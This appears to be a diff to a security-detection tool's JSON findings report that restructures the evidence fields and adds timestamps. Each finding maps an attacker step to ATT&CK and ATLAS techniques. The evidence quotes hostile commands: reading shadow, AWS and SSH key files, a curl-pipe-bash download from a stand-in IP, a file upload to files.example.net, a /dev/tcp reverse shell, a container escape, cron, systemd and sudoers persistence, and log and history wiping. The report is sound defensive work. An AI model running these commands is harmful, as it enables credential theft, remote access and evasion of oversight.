@@ -6,9 +6,24 @@
     "indicator": null,
     "files": "20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-22T09:15:00Z",
+    "last": "2026-10-22T09:35:00Z",
     "attack": "T1136.001",
     "atlas": "AML.T0125",
-    "evidence": "useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)\nuseradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:15:00Z",
+        "file": "20261022_091500_step04_persist.sh",
+        "line": 7,
+        "text": "useradd -m -s /bin/bash svc"
+      },
+      {
+        "time": "2026-10-22T09:35:00Z",
+        "file": "audit_20261022_093500.jsonl",
+        "line": null,
+        "text": "useradd -m -s /bin/bash svc"
+      }
+    ]
   },
   {
     "finding": "CloudMetadataAccess",
@@ -17,9 +32,18 @@
     "indicator": null,
     "files": "20261022_090000_step01_recon.sh",
     "attribution": null,
+    "first": "2026-10-22T09:00:00Z",
+    "last": "2026-10-22T09:00:00Z",
     "attack": "T1552.005",
     "atlas": "AML.T0055",
-    "evidence": "curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:00:00Z",
+        "file": "20261022_090000_step01_recon.sh",
+        "line": 9,
+        "text": "curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt"
+      }
+    ]
   },
   {
     "finding": "ClusterSecretRead",
@@ -28,9 +52,18 @@
     "indicator": null,
     "files": "20261022_090500_step02_creds.sh",
     "attribution": null,
+    "first": "2026-10-22T09:05:00Z",
+    "last": "2026-10-22T09:05:00Z",
     "attack": "T1552.007",
     "atlas": "AML.T0055",
-    "evidence": "kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:05:00Z",
+        "file": "20261022_090500_step02_creds.sh",
+        "line": 7,
+        "text": "kubectl get secrets -A -o yaml"
+      }
+    ]
   },
   {
     "finding": "ContainerEscape",
@@ -39,9 +72,18 @@
     "indicator": null,
     "files": "20261022_091000_step03_privesc.sh",
     "attribution": null,
+    "first": "2026-10-22T09:10:00Z",
+    "last": "2026-10-22T09:10:00Z",
     "attack": "T1611",
     "atlas": "AML.T0105",
-    "evidence": "docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:10:00Z",
+        "file": "20261022_091000_step03_privesc.sh",
+        "line": 6,
+        "text": "docker run -v /:/host alpine ls /host"
+      }
+    ]
   },
   {
     "finding": "CredentialFileRead",
@@ -50,9 +92,18 @@
     "indicator": null,
     "files": "20261022_090500_step02_creds.sh",
     "attribution": null,
+    "first": "2026-10-22T09:05:00Z",
+    "last": "2026-10-22T09:05:00Z",
     "attack": "T1552.001",
     "atlas": "AML.T0055",
-    "evidence": "cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:05:00Z",
+        "file": "20261022_090500_step02_creds.sh",
+        "line": 3,
+        "text": "cat ~/.aws/credentials"
+      }
+    ]
   },
   {
     "finding": "FileUpload",
@@ -61,9 +112,18 @@
     "indicator": null,
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": "T1048",
     "atlas": "AML.T0025",
-    "evidence": "curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:25:00Z",
+        "file": "20261022_092500_step06_stage.sh",
+        "line": 8,
+        "text": "curl -T out.tgz https://files.example.net/up"
+      }
+    ]
   },
   {
     "finding": "FirewallDisabling",
@@ -72,9 +132,24 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:35:00Z",
     "attack": "T1686",
     "atlas": null,
-    "evidence": "iptables -F (20261022_092000_step05_evade.sh:5)\niptables -F (audit_20261022_093500.jsonl)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:20:00Z",
+        "file": "20261022_092000_step05_evade.sh",
+        "line": 5,
+        "text": "iptables -F"
+      },
+      {
+        "time": "2026-10-22T09:35:00Z",
+        "file": "audit_20261022_093500.jsonl",
+        "line": null,
+        "text": "iptables -F"
+      }
+    ]
   },
   {
     "finding": "HistoryDisabling",
@@ -83,9 +158,18 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:20:00Z",
     "attack": "T1690",
     "atlas": null,
-    "evidence": "unset HISTFILE (20261022_092000_step05_evade.sh:3)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:20:00Z",
+        "file": "20261022_092000_step05_evade.sh",
+        "line": 3,
+        "text": "unset HISTFILE"
+      }
+    ]
   },
   {
     "finding": "LogDeletion",
@@ -94,9 +178,18 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:20:00Z",
     "attack": "T1685.006",
     "atlas": null,
-    "evidence": "rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:20:00Z",
+        "file": "20261022_092000_step05_evade.sh",
+        "line": 6,
+        "text": "rm -f /var/log/auth.log"
+      }
+    ]
   },
   {
     "finding": "PrivateKeyRead",
@@ -105,9 +198,18 @@
     "indicator": null,
     "files": "20261022_090500_step02_creds.sh",
     "attribution": null,
+    "first": "2026-10-22T09:05:00Z",
+    "last": "2026-10-22T09:05:00Z",
     "attack": "T1552.004",
     "atlas": "AML.T0055",
-    "evidence": "cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:05:00Z",
+        "file": "20261022_090500_step02_creds.sh",
+        "line": 4,
+        "text": "cat ~/.ssh/id_rsa"
+      }
+    ]
   },
   {
     "finding": "ReverseShell",
@@ -116,9 +218,18 @@
     "indicator": null,
     "files": "20261022_093000_step07_channel.py",
     "attribution": null,
+    "first": "2026-10-22T09:30:00Z",
+    "last": "2026-10-22T09:30:00Z",
     "attack": "T1059.004, T1095",
     "atlas": "AML.T0050",
-    "evidence": "os.system(\"exec 3<>/dev/tcp/$H/$PORT\") (20261022_093000_step07_channel.py:8)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:30:00Z",
+        "file": "20261022_093000_step07_channel.py",
+        "line": 8,
+        "text": "os.system(\"exec 3<>/dev/tcp/$H/$PORT\")"
+      }
+    ]
   },
   {
     "finding": "ScheduledJobCreation",
@@ -127,9 +238,24 @@
     "indicator": null,
     "files": "20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-22T09:15:00Z",
+    "last": "2026-10-22T09:35:00Z",
     "attack": "T1053.003, T1053.002, T1053.006",
     "atlas": null,
-    "evidence": "(crontab -l; echo \"$JOB\") | crontab - (20261022_091500_step04_persist.sh:3)\ncrontab - (audit_20261022_093500.jsonl)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:15:00Z",
+        "file": "20261022_091500_step04_persist.sh",
+        "line": 3,
+        "text": "(crontab -l; echo \"$JOB\") | crontab -"
+      },
+      {
+        "time": "2026-10-22T09:35:00Z",
+        "file": "audit_20261022_093500.jsonl",
+        "line": null,
+        "text": "crontab -"
+      }
+    ]
   },
   {
     "finding": "SecurityToolDisabling",
@@ -138,9 +264,24 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:35:00Z",
     "attack": "T1685, T1685.004",
     "atlas": null,
-    "evidence": "systemctl stop auditd (20261022_092000_step05_evade.sh:4)\nsystemctl stop auditd (audit_20261022_093500.jsonl)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:20:00Z",
+        "file": "20261022_092000_step05_evade.sh",
+        "line": 4,
+        "text": "systemctl stop auditd"
+      },
+      {
+        "time": "2026-10-22T09:35:00Z",
+        "file": "audit_20261022_093500.jsonl",
+        "line": null,
+        "text": "systemctl stop auditd"
+      }
+    ]
   },
   {
     "finding": "SetuidBit",
@@ -149,9 +290,18 @@
     "indicator": null,
     "files": "20261022_091000_step03_privesc.sh",
     "attribution": null,
+    "first": "2026-10-22T09:10:00Z",
+    "last": "2026-10-22T09:10:00Z",
     "attack": "T1548.001",
     "atlas": null,
-    "evidence": "chmod u+s \"$F\" (20261022_091000_step03_privesc.sh:4)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:10:00Z",
+        "file": "20261022_091000_step03_privesc.sh",
+        "line": 4,
+        "text": "chmod u+s \"$F\""
+      }
+    ]
   },
   {
     "finding": "ShadowFileRead",
@@ -160,9 +310,18 @@
     "indicator": null,
     "files": "20261022_090500_step02_creds.sh",
     "attribution": null,
+    "first": "2026-10-22T09:05:00Z",
+    "last": "2026-10-22T09:05:00Z",
     "attack": "T1003.008",
     "atlas": "AML.T0090",
-    "evidence": "sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:05:00Z",
+        "file": "20261022_090500_step02_creds.sh",
+        "line": 6,
+        "text": "sudo cat /etc/shadow > shadow_20261022_090530.txt"
+      }
+    ]
   },
   {
     "finding": "ShellDownloadAndExecute",
@@ -171,9 +330,18 @@
     "indicator": null,
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": "T1059.004, T1105",
     "atlas": "AML.T0072, AML.T0050",
-    "evidence": "sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:25:00Z",
+        "file": "20261022_092500_step06_stage.sh",
+        "line": 4,
+        "text": "sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\""
+      }
+    ]
   },
   {
     "finding": "ShellHistoryRead",
@@ -182,9 +350,18 @@
     "indicator": null,
     "files": "20261022_090500_step02_creds.sh",
     "attribution": null,
+    "first": "2026-10-22T09:05:00Z",
+    "last": "2026-10-22T09:05:00Z",
     "attack": "T1552.003",
     "atlas": "AML.T0055",
-    "evidence": "grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:05:00Z",
+        "file": "20261022_090500_step02_creds.sh",
+        "line": 5,
+        "text": "grep -i token ~/.bash_history"
+      }
+    ]
   },
   {
     "finding": "ShellProfilePersistence",
@@ -193,9 +370,18 @@
     "indicator": null,
     "files": "20261022_091500_step04_persist.sh",
     "attribution": null,
+    "first": "2026-10-22T09:15:00Z",
+    "last": "2026-10-22T09:15:00Z",
     "attack": "T1546.004",
     "atlas": "AML.T0142",
-    "evidence": "echo \"$LINE\" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:15:00Z",
+        "file": "20261022_091500_step04_persist.sh",
+        "line": 8,
+        "text": "echo \"$LINE\" >> ~/.bashrc"
+      }
+    ]
   },
   {
     "finding": "SshKeyPersistence",
@@ -204,9 +390,18 @@
     "indicator": null,
     "files": "20261022_091500_step04_persist.sh",
     "attribution": null,
+    "first": "2026-10-22T09:15:00Z",
+    "last": "2026-10-22T09:15:00Z",
     "attack": "T1098.004",
     "atlas": null,
-    "evidence": "echo \"$KEY\" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:15:00Z",
+        "file": "20261022_091500_step04_persist.sh",
+        "line": 4,
+        "text": "echo \"$KEY\" >> ~/.ssh/authorized_keys"
+      }
+    ]
   },
   {
     "finding": "SudoersModification",
@@ -215,9 +410,18 @@
     "indicator": null,
     "files": "20261022_091000_step03_privesc.sh",
     "attribution": null,
+    "first": "2026-10-22T09:10:00Z",
+    "last": "2026-10-22T09:10:00Z",
     "attack": "T1548.003",
     "atlas": null,
-    "evidence": "echo \"$RULE\" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:10:00Z",
+        "file": "20261022_091000_step03_privesc.sh",
+        "line": 5,
+        "text": "echo \"$RULE\" >> /etc/sudoers.d/svc"
+      }
+    ]
   },
   {
     "finding": "SystemdUnitCreation",
@@ -226,9 +430,24 @@
     "indicator": null,
     "files": "20261022_091500_step04_persist.sh",
     "attribution": null,
+    "first": "2026-10-22T09:15:00Z",
+    "last": "2026-10-22T09:15:00Z",
     "attack": "T1543.002",
     "atlas": null,
-    "evidence": "cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)\nsystemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:15:00Z",
+        "file": "20261022_091500_step04_persist.sh",
+        "line": 5,
+        "text": "cp sync.service /etc/systemd/system/sync.service"
+      },
+      {
+        "time": "2026-10-22T09:15:00Z",
+        "file": "20261022_091500_step04_persist.sh",
+        "line": 6,
+        "text": "systemctl enable --now sync.service"
+      }
+    ]
   },
   {
     "finding": "Domain",
@@ -237,6 +456,8 @@
     "indicator": "build01.corp.internal",
     "files": "hosts_20261022_090025.txt",
     "attribution": null,
+    "first": "2026-10-22T09:00:25Z",
+    "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -248,6 +469,8 @@
     "indicator": "corp.example",
     "files": "env_20261022_090540.txt",
     "attribution": null,
+    "first": "2026-10-22T09:05:40Z",
+    "last": "2026-10-22T09:05:40Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -259,6 +482,8 @@
     "indicator": "db01.corp.internal",
     "files": "env_20261022_090540.txt, hosts_20261022_090025.txt",
     "attribution": null,
+    "first": "2026-10-22T09:00:25Z",
+    "last": "2026-10-22T09:05:40Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -270,6 +495,8 @@
     "indicator": "files.example.net",
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -281,6 +508,8 @@
     "indicator": "alerts@corp.example",
     "files": "env_20261022_090540.txt",
     "attribution": null,
+    "first": "2026-10-22T09:05:40Z",
+    "last": "2026-10-22T09:05:40Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -292,6 +521,8 @@
     "indicator": "10.20.30.5",
     "files": "hosts_20261022_090025.txt",
     "attribution": null,
+    "first": "2026-10-22T09:00:25Z",
+    "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -303,6 +534,8 @@
     "indicator": "10.20.30.6",
     "files": "hosts_20261022_090025.txt",
     "attribution": null,
+    "first": "2026-10-22T09:00:25Z",
+    "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -314,6 +547,8 @@
     "indicator": "127.0.0.1",
     "files": "hosts_20261022_090025.txt",
     "attribution": null,
+    "first": "2026-10-22T09:00:25Z",
+    "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -325,6 +560,8 @@
     "indicator": "169.254.169.254",
     "files": "20261022_090000_step01_recon.sh",
     "attribution": null,
+    "first": "2026-10-22T09:00:00Z",
+    "last": "2026-10-22T09:00:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -336,6 +573,8 @@
     "indicator": "198.51.100.7",
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -347,6 +586,8 @@
     "indicator": "203.0.113.40",
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -358,6 +599,8 @@
     "indicator": "203.0.113.41",
     "files": "20261022_093000_step07_channel.py",
     "attribution": null,
+    "first": "2026-10-22T09:30:00Z",
+    "last": "2026-10-22T09:30:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -369,6 +612,8 @@
     "indicator": "http://169.254.169.254/latest/meta-data/",
     "files": "20261022_090000_step01_recon.sh",
     "attribution": null,
+    "first": "2026-10-22T09:00:00Z",
+    "last": "2026-10-22T09:00:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -380,6 +625,8 @@
     "indicator": "http://203.0.113.40/s.sh",
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -391,6 +638,8 @@
     "indicator": "https://files.example.net/up",
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
     "evidence": null
@@ -402,6 +651,8 @@
     "indicator": null,
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:30:00Z",
     "attack": "TA0011",
     "atlas": "AML.TA0014",
     "evidence": null
@@ -413,6 +664,8 @@
     "indicator": null,
     "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh",
     "attribution": null,
+    "first": "2026-10-22T09:00:00Z",
+    "last": "2026-10-22T09:05:00Z",
     "attack": "TA0006",
     "atlas": "AML.TA0013",
     "evidence": null
@@ -424,6 +677,8 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:20:00Z",
     "attack": "TA0112",
     "atlas": "AML.TA0007",
     "evidence": null
@@ -435,6 +690,8 @@
     "indicator": null,
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:30:00Z",
     "attack": "TA0010",
     "atlas": "AML.TA0010",
     "evidence": null
@@ -446,6 +703,8 @@
     "indicator": null,
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": "TA0008",
     "atlas": "AML.TA0015",
     "evidence": null
@@ -457,6 +716,8 @@
     "indicator": null,
     "files": "20261022_091500_step04_persist.sh",
     "attribution": null,
+    "first": "2026-10-22T09:15:00Z",
+    "last": "2026-10-22T09:15:00Z",
     "attack": "TA0003",
     "atlas": "AML.TA0006",
     "evidence": null
@@ -468,6 +729,8 @@
     "indicator": null,
     "files": "20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh",
     "attribution": null,
+    "first": "2026-10-22T09:10:00Z",
+    "last": "2026-10-22T09:15:00Z",
     "attack": "TA0004",
     "atlas": "AML.TA0012",
     "evidence": null
@@ -479,9 +742,18 @@
     "indicator": null,
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": "T1560.001",
     "atlas": null,
-    "evidence": "tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:25:00Z",
+        "file": "20261022_092500_step06_stage.sh",
+        "line": 3,
+        "text": "tar czf out.tgz dir/"
+      }
+    ]
   },
   {
     "finding": "HistoryClearing",
@@ -490,9 +762,18 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:20:00Z",
     "attack": "T1070.003",
     "atlas": "AML.T0138",
-    "evidence": "history -c (20261022_092000_step05_evade.sh:7)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:20:00Z",
+        "file": "20261022_092000_step05_evade.sh",
+        "line": 7,
+        "text": "history -c"
+      }
+    ]
   },
   {
     "finding": "Timestomp",
@@ -501,9 +782,18 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:20:00Z",
     "attack": "T1070.006",
     "atlas": "AML.T0138",
-    "evidence": "touch -r /bin/ls \"$F\" (20261022_092000_step05_evade.sh:8)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:20:00Z",
+        "file": "20261022_092000_step05_evade.sh",
+        "line": 8,
+        "text": "touch -r /bin/ls \"$F\""
+      }
+    ]
   },
   {
     "finding": "tactic",
@@ -512,6 +802,8 @@
     "indicator": null,
     "files": "20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:25:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": "TA0009",
     "atlas": "AML.TA0009",
     "evidence": null
@@ -523,6 +815,8 @@
     "indicator": null,
     "files": "20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attribution": null,
+    "first": "2026-10-22T09:15:00Z",
+    "last": "2026-10-22T09:30:00Z",
     "attack": "TA0002",
     "atlas": "AML.TA0005",
     "evidence": null
@@ -534,6 +828,8 @@
     "indicator": null,
     "files": "20261022_092000_step05_evade.sh",
     "attribution": null,
+    "first": "2026-10-22T09:20:00Z",
+    "last": "2026-10-22T09:20:00Z",
     "attack": "TA0005",
     "atlas": "AML.TA0007",
     "evidence": null
@@ -545,9 +841,18 @@
     "indicator": null,
     "files": "20261022_090000_step01_recon.sh",
     "attribution": null,
+    "first": "2026-10-22T09:00:00Z",
+    "last": "2026-10-22T09:00:00Z",
     "attack": "T1007",
     "atlas": null,
-    "evidence": "systemctl status sshd (20261022_090000_step01_recon.sh:7)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:00:00Z",
+        "file": "20261022_090000_step01_recon.sh",
+        "line": 7,
+        "text": "systemctl status sshd"
+      }
+    ]
   },
   {
     "finding": "SetuidFileSearch",
@@ -556,9 +861,18 @@
     "indicator": null,
     "files": "20261022_090000_step01_recon.sh",
     "attribution": null,
+    "first": "2026-10-22T09:00:00Z",
+    "last": "2026-10-22T09:00:00Z",
     "attack": "T1083",
     "atlas": null,
-    "evidence": "find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)"
+    "evidence": [
+      {
+        "time": "2026-10-22T09:00:00Z",
+        "file": "20261022_090000_step01_recon.sh",
+        "line": 8,
+        "text": "find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt"
+      }
+    ]
   },
   {
     "finding": "tactic",
@@ -567,6 +881,8 @@
     "indicator": null,
     "files": "20261022_090000_step01_recon.sh, 20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_092500_step06_stage.sh",
     "attribution": null,
+    "first": "2026-10-22T09:00:00Z",
+    "last": "2026-10-22T09:25:00Z",
     "attack": "TA0007",
     "atlas": "AML.TA0008",
     "evidence": null
